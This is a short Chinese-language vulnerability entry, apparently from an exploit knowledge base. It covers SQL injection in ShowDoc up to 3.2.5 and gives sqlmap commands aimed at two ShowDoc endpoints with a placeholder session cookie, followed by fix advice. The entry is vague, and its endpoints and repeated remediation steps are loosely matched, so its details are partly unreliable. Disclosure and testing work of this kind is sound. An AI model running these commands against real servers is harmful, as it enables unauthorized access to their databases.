---
id: SHOWDOC-3.2.5-SQLI
title: ShowDoc SQL注入漏洞
product: showdoc
vendor: ShowDoc
version_affected: "<= 3.2.5"
severity: HIGH
tags: [sqli, 需要认证]
fingerprint: ["ShowDoc"]
---

## 漏洞描述

ShowDoc 是一个开源的在线共享文档工具。在 <= 3.2.5 版本中存在 SQL 注入漏洞，攻击者可以通过构造恶意请求获取数据库敏感信息。

## 影响版本

- ShowDoc <= 3.2.5

## 前置条件

- 需要认证（部分接口可能未授权）

## 利用步骤

1. 登录 ShowDoc
2. 构造 SQL 注入 payload 进行攻击

## Payload

```bash
# 示例 SQL 注入 payload
sqlmap -u "http://target/index.php?s=/home/page/uploadImg" --cookie="PHPSESSID=xxx" --level=3
```

## 验证方法

```bash
# 使用 sqlmap 检测
sqlmap -u "http://target/index.php?s=/api/item/list" --cookie="PHPSESSID=xxx" --batch
```

## 修复建议

1. 升级 ShowDoc 至最新版本
2. 对用户输入进行严格过滤和参数化查询
3. 升级到更新版本的 ShowDoc
